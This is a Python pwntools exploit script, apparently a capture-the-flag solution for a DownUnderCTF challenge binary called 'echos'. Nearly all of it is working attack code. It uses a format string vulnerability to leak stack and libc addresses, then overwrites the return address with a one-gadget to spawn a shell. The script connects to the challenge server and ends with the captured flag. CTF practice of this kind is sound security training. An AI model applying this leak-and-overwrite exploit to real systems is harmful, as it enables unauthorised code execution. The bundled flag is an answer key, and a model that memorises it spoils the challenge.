"""
Use format string vulnerability to first leak stack and libc, then re use to overwrite
return address with a one gadget
"""
from pwn import *

binary_path = "./echos"
#lib_path = "/home/kali/HeapLAB/.glibc/glibc_2.27/"

lib_path = "./lib/"
LIBC_OFFSET = 0x110081
STACK_RET_OFFSET = 0x58
ONE_GADGET_OFFSET = 0x10a38c

elf = context.binary = ELF(binary_path)
libc = ELF(lib_path + "libc.so.6")

gs="""

python
import splitmind
(splitmind.Mind()
    .tell_splitter(show_titles=True)
    .tell_splitter(set_title="gdb")
     #.above(of="main", display="expressions", size="75%")
     #.left(of="expressions", display="disasm", size="35%")
    .above(of="main", display="stack", size="75%")
    .left(of="stack", display="regs", size="66%")
    .right(of="regs", display="disasm")
).build(nobanner=True)
end

#break main

continue
"""
def start():
    if args.DEBUG:
        context.log_level = "DEBUG"

    if args.REMOTE:
        # nc chal.duc.tf 30001
        return remote("chal.duc.tf", 30001)

    if args.GDB:
        context.terminal = ["tmux", "split-window", "-v", "-b", "-p", "80"]
        return gdb.debug(binary_path, gdbscript=gs, env={"LD_LIBRARY_PATH": lib_path})
    else:
        return process(binary_path, env={"LD_LIBRARY_PATH": lib_path})


def exec_fmt(payload):
    p = process(binary_path, env={"LD_LIBRARY_PATH": lib_path})
    p.sendline(payload)
    p.sendline()
    p.sendline()
    return p.recvall()


# Calculate format string offset automatically (pwntools ftw)
autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

print(f"OFFSET {offset}")

io = start()

# Leak libc and stack
io.sendline("%p " * 3)

leak = io.recvline().split(b' ')
return_addr = int(leak[0], base=16) + STACK_RET_OFFSET
libc.address = int(leak[2], base=16) - LIBC_OFFSET

print(f"LIBC: {hex(libc.address)}")
print(f"RETURN ADDR: {hex(return_addr)}")

one_gadget_addr = libc.address + ONE_GADGET_OFFSET
print(f"ONE GADGET: {hex(one_gadget_addr)}")

# Overwrite return address with one gadget. Need to use write size "short", it's the only
# one that fits within the 64 bytes we have (pwntools ftw, mk II)
payload = fmtstr_payload(offset, {return_addr: one_gadget_addr}, write_size='short')
io.sendline(payload)

io.interactive()

# DUCTF{D@N6340U$_AF_F0RMAT_STTR1NG$}
